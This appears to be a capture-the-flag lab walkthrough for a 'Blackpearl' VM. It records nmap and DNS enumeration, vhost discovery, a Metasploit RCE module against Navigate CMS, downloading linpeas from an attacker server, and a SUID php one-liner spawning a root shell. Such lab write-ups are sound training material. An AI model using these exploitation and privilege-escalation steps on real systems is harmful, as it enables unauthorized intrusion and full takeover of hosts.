# Scanning & Enumeration

## Nmap

Scan subnet:
```bash
nmap -sn 10.0.0.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 16:37 CET
Nmap scan report for 10.0.0.11
Host is up (0.00076s latency).
Nmap scan report for 10.0.0.17
Host is up (0.00054s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.52 seconds
```

Scan all ports:
```bash
# Nmap 7.94SVN scan initiated Fri Mar  8 16:38:10 2024 as: nmap -p- -oN blackpearl_all.nmap 10.0.0.17
Nmap scan report for 10.0.0.17
Host is up (0.00048s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

# Nmap done at Fri Mar  8 16:38:15 2024 -- 1 IP address (1 host up) scanned in 4.84 seconds
```

Scan services on open ports:
```bash
# Nmap 7.94SVN scan initiated Fri Mar  8 16:39:06 2024 as: nmap -p 22,53,80 -sV -sC -oN blackpearl_open.nmap 10.0.0.17
Nmap scan report for 10.0.0.17
Host is up (0.00033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 16:39:20 2024 -- 1 IP address (1 host up) scanned in 14.44 seconds
```

UDP scan:
```bash
# Nmap 7.94SVN scan initiated Fri Mar  8 16:45:48 2024 as: nmap -sU -oN blackpearl_udp.nmap 10.0.0.17
Nmap scan report for 10.0.0.17
Host is up (0.00026s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE
53/udp open          domain
68/udp open|filtered dhcpc
MAC Address: 08:00:27:C6:03:EC (Oracle VirtualBox virtual NIC)

# Nmap done at Fri Mar  8 17:02:38 2024 -- 1 IP address (1 host up) scanned in 1009.23 seconds
```

UDP scan open:
```bash
# Nmap 7.94SVN scan initiated Fri Mar  8 17:10:52 2024 as: nmap -sU -p 53,68 -sV -sC -oN blackpearl_udp_open.nmap 10.0.0.17
Nmap scan report for 10.0.0.17
Host is up (0.00033s latency).

PORT   STATE         SERVICE VERSION
53/udp open          domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
|_dns-recursion: Recursion appears to be enabled
68/udp open|filtered dhcpc
MAC Address: 08:00:27:C6:03:EC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  8 17:12:46 2024 -- 1 IP address (1 host up) scanned in 114.38 seconds
```

## HTTP

Directory enumeration with gobuster:
![[Pasted image 20240308164812.png]]
=> /secret
```
OMG you got r00t !


Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 

```

Use *dnsrecon* to enumerate domain names on the remote dns server via reverse DNS lookups:
```bash
dnsrecon -r 127.0.0.0/24 -n 10.0.0.17
```
Args:
`-r`: Reverse lookup IP address range
`-n`: Name server

![[Pasted image 20240308173454.png]]

Edit the file `/etc/hosts and add the line:
`10.0.0.17       blackpearl.tcm`

Now, wwhen we navigate to *http://blackpearl.tcm* in our browser, the browser will set the Host header to *blackpearl.tcm*, which in this case is a virtual host. And thus we are able to access the homepage of that virtual host.

![[Pasted image 20240308173740.png]]

Enumerate directories:
![[Pasted image 20240308174002.png]]
=> /navigate

Enumerate files:
![[Pasted image 20240308174103.png]]
=> index.php: this is the PHPinfo page
=> crossdomain.xml:
![[Pasted image 20240308174137.png]]

Enumerate dir of /navigate:
![[Pasted image 20240308174243.png]]

Enum files of /navigate:
![[Pasted image 20240308174319.png]]

At http://blackpearl.tcm/navigate/login.php there is a login page:
![[Pasted image 20240308174727.png]]
In the bottom right corner we can see that this is a CMS and also the version:
![[Pasted image 20240308174809.png]]

Googling "navigate cms" we come across an RCE exploit for the software:
https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
# Exploitation

Msfconsole search "navigate":
![[Pasted image 20240308175008.png]]
```msfconsole
set RHOSTS blackpearl.tcm
run
```
=> this give as a meterpreter shell.
With the meterpreter command `shell` we get a system shell.

Optional:
We could spawn a TTY shell (https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html)

Download *linpeas.sh* from attacker http server and execute it.
`/usr/bin/php7.3` is a SUID binary:
![[Pasted image 20240308220255.png]]

From https://gtfobins.github.io/gtfobins/php/ SUID just use the last line with the php binary: 
```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Success! We got a root shell:
![[Pasted image 20240308221008.png]]
